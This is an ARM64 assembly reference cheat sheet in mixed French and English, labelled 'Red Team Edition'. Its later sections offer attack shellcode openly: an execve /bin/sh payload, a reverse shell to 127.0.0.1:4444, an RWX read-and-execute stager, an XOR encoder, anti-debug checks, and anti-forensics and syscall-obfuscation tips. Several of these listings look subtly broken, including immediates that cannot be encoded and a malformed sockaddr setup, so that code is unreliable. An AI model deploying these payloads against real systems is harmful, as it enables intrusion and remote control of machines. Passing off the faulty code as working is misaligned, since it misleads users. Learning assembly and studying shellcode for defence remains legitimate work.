# Cheatsheet ARM64 Instructions - Red Team Edition

## Architecture ARM64 (AArch64)

### Registres
```
General Purpose (64-bit): X0-X30
32-bit access:            W0-W30 (low 32 bits de X)

X0-X7:   Arguments fonction et return values
X8:      Syscall number (Linux), indirect result (macOS)
X9-X15:  Temporary
X16-X17: Intra-procedure call (IP0, IP1)
X18:     Platform register (TLS sur Linux)
X19-X28: Callee-saved
X29:     Frame Pointer (FP)
X30:     Link Register (LR) - return address
SP:      Stack Pointer
PC:      Program Counter

Registres spéciaux:
XZR/WZR: Zero register (lecture = 0, écriture = ignorée)
```

### Flags (NZCV)
```
N: Negative
Z: Zero
C: Carry
V: Overflow
```

## Instructions de base

### Mov et Load
```asm
// Move
mov x0, x1              // x0 = x1
mov x0, #42             // x0 = 42
movz x0, #0x1234        // x0 = 0x1234 (zero haute partie)
movk x0, #0x5678, lsl #16 // x0 |= 0x5678 << 16 (keep autres bits)

// Move avec NOT
mvn x0, x1              // x0 = ~x1

// Load immediate (grande valeur)
ldr x0, =0xdeadbeef     // Pseudo-instruction, utilise literal pool
```

### Arithmétique
```asm
// Addition
add x0, x1, x2          // x0 = x1 + x2
add x0, x1, #10         // x0 = x1 + 10
adds x0, x1, x2         // Add et set flags

// Soustraction
sub x0, x1, x2          // x0 = x1 - x2
sub x0, x1, #5          // x0 = x1 - 5
subs x0, x1, x2         // Sub et set flags
neg x0, x1              // x0 = -x1 (0 - x1)

// Multiplication
mul x0, x1, x2          // x0 = x1 * x2 (64-bit result)
smull x0, w1, w2        // x0 = w1 * w2 (signed, 64-bit result)
umull x0, w1, w2        // Unsigned multiply

// Division
sdiv x0, x1, x2         // x0 = x1 / x2 (signed)
udiv x0, x1, x2         // Unsigned division
```

### Logique
```asm
// AND
and x0, x1, x2          // x0 = x1 & x2
and x0, x1, #0xFF       // x0 = x1 & 0xFF
ands x0, x1, x2         // AND et set flags
tst x0, x1              // Test: x0 & x1, set flags uniquement

// OR
orr x0, x1, x2          // x0 = x1 | x2
orr x0, x1, #0xF        // x0 = x1 | 0xF

// XOR
eor x0, x1, x2          // x0 = x1 ^ x2
eor x0, x1, #0xAA       // x0 = x1 ^ 0xAA

// NOT
mvn x0, x1              // x0 = ~x1

// Bit clear
bic x0, x1, x2          // x0 = x1 & ~x2
```

### Shifts et Rotations
```asm
// Logical shift left
lsl x0, x1, #4          // x0 = x1 << 4

// Logical shift right
lsr x0, x1, #4          // x0 = x1 >> 4 (unsigned)

// Arithmetic shift right
asr x0, x1, #4          // x0 = x1 >> 4 (signed, preserve sign bit)

// Rotate right
ror x0, x1, #4          // x0 = rotate_right(x1, 4)

// Avec registre
lsl x0, x1, x2          // x0 = x1 << x2
lsr x0, x1, x2
asr x0, x1, x2
```

## Load/Store

### Load
```asm
// Load register
ldr x0, [x1]            // x0 = *x1 (64-bit)
ldr w0, [x1]            // w0 = *(uint32_t*)x1 (32-bit)
ldrh w0, [x1]           // w0 = *(uint16_t*)x1 (16-bit)
ldrb w0, [x1]           // w0 = *(uint8_t*)x1 (8-bit)

// Load signed
ldrsw x0, [x1]          // Sign-extend 32->64
ldrsh x0, [x1]          // Sign-extend 16->64
ldrsb x0, [x1]          // Sign-extend 8->64

// Load avec offset
ldr x0, [x1, #8]        // x0 = *(x1 + 8)
ldr x0, [x1, x2]        // x0 = *(x1 + x2)
ldr x0, [x1, x2, lsl #3] // x0 = *(x1 + (x2 << 3))

// Pre/Post indexing
ldr x0, [x1, #8]!       // Pre: x1 += 8; x0 = *x1
ldr x0, [x1], #8        // Post: x0 = *x1; x1 += 8

// Load pair
ldp x0, x1, [x2]        // x0 = *x2, x1 = *(x2+8)
ldp x0, x1, [x2, #16]   // x0 = *(x2+16), x1 = *(x2+24)
```

### Store
```asm
// Store register
str x0, [x1]            // *x1 = x0 (64-bit)
str w0, [x1]            // *(uint32_t*)x1 = w0 (32-bit)
strh w0, [x1]           // *(uint16_t*)x1 = w0 (16-bit)
strb w0, [x1]           // *(uint8_t*)x1 = w0 (8-bit)

// Store avec offset
str x0, [x1, #8]        // *(x1 + 8) = x0
str x0, [x1, x2]        // *(x1 + x2) = x0

// Pre/Post indexing
str x0, [x1, #8]!       // Pre: x1 += 8; *x1 = x0
str x0, [x1], #8        // Post: *x1 = x0; x1 += 8

// Store pair
stp x0, x1, [x2]        // *x2 = x0, *(x2+8) = x1
stp x0, x1, [x2, #16]   // *(x2+16) = x0, *(x2+24) = x1
```

## Branches et Contrôle

### Branches inconditionnelles
```asm
// Branch
b label                 // PC = label (±128MB)
bl func                 // LR = PC+4; PC = func (call)
br x0                   // PC = x0 (indirect branch)
blr x0                  // LR = PC+4; PC = x0 (indirect call)
ret                     // PC = LR (return)
ret x0                  // PC = x0
```

### Branches conditionnelles
```asm
// Après comparaison (cmp, tst, etc.)
beq label               // Branch if equal (Z=1)
bne label               // Branch if not equal (Z=0)
bgt label               // Branch if greater than (signed)
bge label               // Branch if greater or equal (signed)
blt label               // Branch if less than (signed)
ble label               // Branch if less or equal (signed)
bhi label               // Branch if higher (unsigned)
bhs label               // Branch if higher or same (unsigned)
blo label               // Branch if lower (unsigned)
bls label               // Branch if lower or same (unsigned)

// Conditions directes sur registre
cbz x0, label           // Branch if x0 == 0
cbnz x0, label          // Branch if x0 != 0
tbz x0, #5, label       // Branch if bit 5 of x0 == 0
tbnz x0, #5, label      // Branch if bit 5 of x0 == 1

// Exemples
cmp x0, x1              // Compare x0 et x1
beq equal               // Si x0 == x1
bgt greater             // Si x0 > x1 (signed)
```

### Comparaison
```asm
// Compare
cmp x0, x1              // Set flags: x0 - x1
cmp x0, #42             // Set flags: x0 - 42
cmn x0, x1              // Set flags: x0 + x1

// Test (AND sans sauvegarder résultat)
tst x0, x1              // Set flags: x0 & x1
tst x0, #0xFF           // Set flags: x0 & 0xFF
```

## Stack Operations

### Push/Pop (pas d'instructions dédiées)
```asm
// Push single register
str x0, [sp, #-16]!     // Pre-decrement: sp -= 16; *sp = x0

// Pop single register
ldr x0, [sp], #16       // Post-increment: x0 = *sp; sp += 16

// Push multiple (standard)
stp x29, x30, [sp, #-16]! // Push FP et LR
stp x0, x1, [sp, #-16]!   // Push x0 et x1

// Pop multiple
ldp x0, x1, [sp], #16     // Pop x0 et x1
ldp x29, x30, [sp], #16   // Pop FP et LR
```

## Syscalls

### Linux ARM64
```asm
// Syscall number dans X8
// Arguments: X0-X5
// Return: X0
// Instruction: svc #0

// Exemple: write(1, "Hello\n", 6)
mov x8, #64             // syscall write
mov x0, #1              // fd = stdout
adr x1, msg             // buf
mov x2, #6              // count
svc #0                  // syscall

msg: .ascii "Hello\n"
```

### iOS/macOS ARM64
```asm
// Syscall number dans X16
// Arguments: X0-X5
// Return: X0
// Instruction: svc #0x80

// Exemple: exit(0)
mov x16, #1             // syscall exit
mov x0, #0              // status
svc #0x80
```

## Function Prologue/Epilogue

### Prologue standard
```asm
// Sauvegarder FP et LR, setup frame
stp x29, x30, [sp, #-16]!  // Push FP, LR
mov x29, sp                 // FP = SP

// Si variables locales nécessaires
sub sp, sp, #32             // Allouer 32 bytes sur stack
```

### Epilogue standard
```asm
// Restaurer stack et return
mov sp, x29                 // SP = FP
ldp x29, x30, [sp], #16     // Pop FP, LR
ret                         // Return
```

## Shellcode Techniques

### Position-Independent Code (PIC)
```asm
// Obtenir adresse courante (PC-relative)
adr x0, current
current:
    // x0 = adresse de 'current'

// Charger data relative
adr x0, data
ldr x1, [x0]

data: .quad 0xdeadbeef

// Branch relative
b target                    // Automatiquement PC-relative
```

### String Loading
```asm
// Charger string sur stack (éviter .data)
mov x0, #0x6f77             // "wo"
movk x0, #0x6c6c, lsl #16   // "ll"
movk x0, #0x6548, lsl #32   // "He"
str x0, [sp, #-8]!

mov x0, #0x0a64             // "\nd"
movk x0, #0x6c72, lsl #16   // "rl"
str x0, [sp, #-8]!

// SP pointe maintenant vers "Hello world\n"
```

### XOR Encoder
```asm
// Decoder loop
adr x0, encoded             // Adresse shellcode encodé
mov x1, #shellcode_len      // Longueur
mov x2, #0xAA               // Clé XOR

decode_loop:
    ldrb w3, [x0]           // Charger byte
    eor w3, w3, w2          // XOR avec clé
    strb w3, [x0], #1       // Stocker et incrémenter
    subs x1, x1, #1         // Décrémenter compteur
    bne decode_loop         // Loop si pas fini

encoded:
    .byte 0xc2, 0xcf, ...   // Shellcode XOR 0xAA
```

## Shellcode Examples

### Execve /bin/sh (Linux ARM64)
```asm
.global _start
_start:
    // execve("/bin/sh", NULL, NULL)

    // Construire "/bin/sh" sur stack
    mov x0, #0x68732f         // "hs/"
    movk x0, #0x6e69, lsl #16 // "ni"
    movk x0, #0x622f, lsl #32 // "b/"
    str x0, [sp, #-8]!

    // Setup arguments
    mov x0, sp                // x0 = "/bin/sh"
    mov x1, #0                // argv = NULL
    mov x2, #0                // envp = NULL
    mov x8, #221              // syscall execve
    svc #0

// Taille: ~32 bytes
```

### Reverse Shell (Linux ARM64)
```asm
.global _start
_start:
    // socket(AF_INET, SOCK_STREAM, 0)
    mov x8, #198              // syscall socket
    mov x0, #2                // AF_INET
    mov x1, #1                // SOCK_STREAM
    mov x2, #0                // protocol
    svc #0
    mov x3, x0                // Save sockfd

    // connect(sockfd, &sockaddr, 16)
    // Construire sockaddr_in sur stack
    mov x1, #0x0100007f       // sin_addr = 127.0.0.1
    movk x1, #0x5c11, lsl #16 // sin_port = htons(4444)
    str x1, [sp, #-16]!
    mov x1, #2                // sin_family = AF_INET
    strh w1, [sp, #-2]!

    mov x8, #203              // syscall connect
    mov x0, x3                // sockfd
    mov x1, sp                // sockaddr
    mov x2, #16               // addrlen
    svc #0

    // dup2(sockfd, 0/1/2)
    mov x1, #0                // newfd = 0 (stdin)
dup_loop:
    mov x8, #24               // syscall dup3 (ou dup2)
    mov x0, x3                // sockfd
    svc #0
    add x1, x1, #1            // newfd++
    cmp x1, #3
    blt dup_loop

    // execve("/bin/sh", NULL, NULL)
    mov x0, #0x68732f
    movk x0, #0x6e69, lsl #16
    movk x0, #0x622f, lsl #32
    str x0, [sp, #-8]!
    mov x0, sp
    mov x1, #0
    mov x2, #0
    mov x8, #221              // execve
    svc #0
```

### Read-Exec Loop (Stager)
```asm
_start:
    // mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0)
    mov x8, #222              // syscall mmap
    mov x0, #0                // addr = NULL
    mov x1, #4096             // len
    mov x2, #7                // prot = RWX
    mov x3, #0x22             // flags = MAP_PRIVATE|MAP_ANON
    mov x4, #-1               // fd
    mov x5, #0                // offset
    svc #0
    mov x9, x0                // Save mmap address

    // read(0, buffer, 4096)
    mov x8, #63               // syscall read
    mov x0, #0                // fd = stdin
    mov x1, x9                // buf = mmap address
    mov x2, #4096             // count
    svc #0

    // Execute stage2
    br x9                     // Jump to read shellcode
```

## Anti-Debug ARM64

### SIGTRAP Detection
```asm
// Insérer instruction invalide
.word 0xd4200000            // brk #0 (generate SIGTRAP)

// Si debugger: signal handler appelé
// Sinon: crash
```

### Timing
```asm
// Read counter
mrs x0, CNTVCT_EL0          // Virtual count register
// Exécuter code
mrs x1, CNTVCT_EL0
sub x2, x1, x0              // Delta
cmp x2, #1000               // Si trop lent
bgt debugger_detected
```

## Tips Red Team

### 1. Null-byte avoidance
```asm
// Mauvais: mov x0, #0 (peut contenir null byte selon encoding)
// Bon:
eor x0, x0, x0              // x0 = 0
```

### 2. Compact code
```asm
// Utiliser instructions combinées
adds x0, x1, x2             // Add + set flags
cbnz x0, label              // Compare + branch
```

### 3. Register clobbering
```asm
// Nettoyer registres après usage (anti-forensics)
eor x0, x0, x0
eor x1, x1, x1
// etc.
```

### 4. Inline data
```asm
// Sauter over embedded data
b after_data
data: .quad 0xdeadbeef
after_data:
    adr x0, data
    ldr x1, [x0]
```

### 5. Syscall obfuscation
```asm
// Au lieu de mov direct
mov x8, #200
add x8, x8, #21             // x8 = 221 (execve)
svc #0
```

## Instruction Encoding

### Formats principaux
```
Arithmetic: opcode | Rm | imm6 | Rn | Rd
Branch:     opcode | imm26
Load/Store: opcode | imm12 | Rn | Rt
```

### Opcodes communs
```
NOP:     0xd503201f
RET:     0xd65f03c0
BRK #0:  0xd4200000
SVC #0:  0xd4000001
```

## Ressources

### Assembler/Disassembler
```bash
# Assembler
as -o shell.o shell.s
ld -o shell shell.o

# Cross-compile depuis x86-64
aarch64-linux-gnu-as -o shell.o shell.s
aarch64-linux-gnu-ld -o shell shell.o

# Disassemble
objdump -d shell
aarch64-linux-gnu-objdump -d shell

# Extract shellcode
objcopy -O binary -j .text shell shell.bin
xxd -i shell.bin
```

### Debug
```bash
# QEMU user mode
qemu-aarch64 -L /usr/aarch64-linux-gnu shell

# GDB
gdb-multiarch ./shell
(gdb) set architecture aarch64
(gdb) break _start
(gdb) run
```
